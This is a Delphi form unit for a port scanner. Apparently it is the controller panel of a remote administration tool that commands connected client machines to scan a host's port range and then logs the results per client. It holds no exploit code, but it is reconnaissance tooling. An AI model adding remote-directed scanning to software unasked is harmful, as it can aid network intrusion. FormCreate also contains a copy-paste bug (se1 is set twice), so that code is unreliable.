unit UnitPortScanner;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitConnection, IniFiles, ComCtrls, StdCtrls, Spin, ExtCtrls,
  IdTCPServer, Menus;

type
  TFormPortScanner = class(TForm)
    pnl1: TPanel;
    lbl1: TLabel;
    lbl2: TLabel;
    lbl3: TLabel;
    edt1: TEdit;
    se1: TSpinEdit;
    se2: TSpinEdit;
    btn1: TButton;
    lv1: TListView;
    dlgSave1: TSaveDialog;
    pm1: TPopupMenu;
    S1: TMenuItem;
    procedure btn1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
    function RetrievePortList: string;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
    procedure OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
  end;

var
  FormPortScanner: TFormPortScanner;

implementation

uses
  UnitConstants, UnitRepository, UnitFunctions;

{$R *.dfm}

constructor TFormPortScanner.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormPortScanner.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormPortScanner.OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
var
  TmpItem: TListItem;
begin
  lv1.Items.BeginUpdate;
  while ReceivedDatas <> '' do
  begin
    TmpItem := lv1.Items.Add;
    TmpItem.Caption := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    Delete(ReceivedDatas, 1, 2);

    TmpItem.ImageIndex := 0;
  end;
  lv1.Items.EndUpdate;
end;
      
function TFormPortScanner.RetrievePortList: string;
var
  i: Integer;
begin
  Result := '';
  for i:=0 to lv1.Items.Count-1 do
  begin
    Result := Result + lv1.Column[0].Caption + ': ' + lv1.Items.Item[i].Caption + #13#10;
    Result := Result + lv1.Column[1].Caption + ': ' + lv1.Items.Item[i].SubItems.Strings[0] + #13#10;
    Result := Result + lv1.Column[2].Caption + ': ' + lv1.Items.Item[i].SubItems.Strings[1] + #13#10;
    Result := Result + #13#10#13#10;
  end;
end;

procedure TFormPortScanner.btn1Click(Sender: TObject);
begin
  if btn1.Caption = 'Start' then
  begin
    if edt1.Text = '' then
    begin
      MessageBox(Handle, 'Invalid hostname.',
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      edt1.SetFocus;
      Exit;
    end;

    if se1.Value >= se2.Value then
    begin
      MessageBox(Handle, 'Invalid port range numbers.',
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      se1.SetFocus;
      Exit;
    end;

    lv1.Clear;
    btn1.Caption := 'Stop';
    SendDatas(Client.AThread, PORTSCANNERSTART + '|' +
              edt1.Text + '|' + se1.Text + '|' + se2.Text);
  end
  else
  begin
    btn1.Caption := 'Start';
    SendDatas(Client.AThread, PORTSCANNERSTOP + '|');
  end;
end;

procedure TFormPortScanner.S1Click(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := GetUserFolder(Client.Identification);
  dlgSave1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgSave1.InitialDir := TmpStr;
  dlgSave1.FileName := 'ScannerLog_' + MyGetTime('') + '.txt';
  dlgSave1.Filter := '(*.txt)|*.txt';
  dlgSave1.DefaultExt := 'txt';
  if (not dlgSave1.Execute) and (not FileExists(dlgSave1.FileName)) then Exit;
  CreateTextFile(dlgSave1.FileName, RetrievePortList);
end;

procedure TFormPortScanner.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  IniFile: TIniFile;
  TmpStr: string;
begin
  if btn1.Caption = 'Stop' then btn1.Click;

  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Port scanner', 'Left', Left);
  IniFile.WriteInteger('Port scanner', 'Top', Top);  
  IniFile.WriteInteger('Port scanner', 'Width', Width);
  IniFile.WriteInteger('Port scanner', 'Height', Height);
  IniFile.WriteString('Port scanner', 'Host', edt1.Text);
  IniFile.WriteInteger('Port scanner', 'Port begin', se1.Value);
  IniFile.WriteInteger('Port scanner', 'Port end', se2.Value);
  IniFile.Free;
end;

procedure TFormPortScanner.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Port scanner', 'Left', 320);
  Top := IniFile.ReadInteger('Port scanner', 'Top', 138);
  Width := IniFile.ReadInteger('Port scanner', 'Width', 545);
  Height := IniFile.ReadInteger('Port scanner', 'Height', 322);
  edt1.Text := IniFile.ReadString('Port scanner', 'Host', 'localhost');
  se1.Value := IniFile.ReadInteger('Port scanner', 'Port begin', 0);
  se1.Value := IniFile.ReadInteger('Port scanner', 'Port end', 65535);
  IniFile.Free;
end;

end.
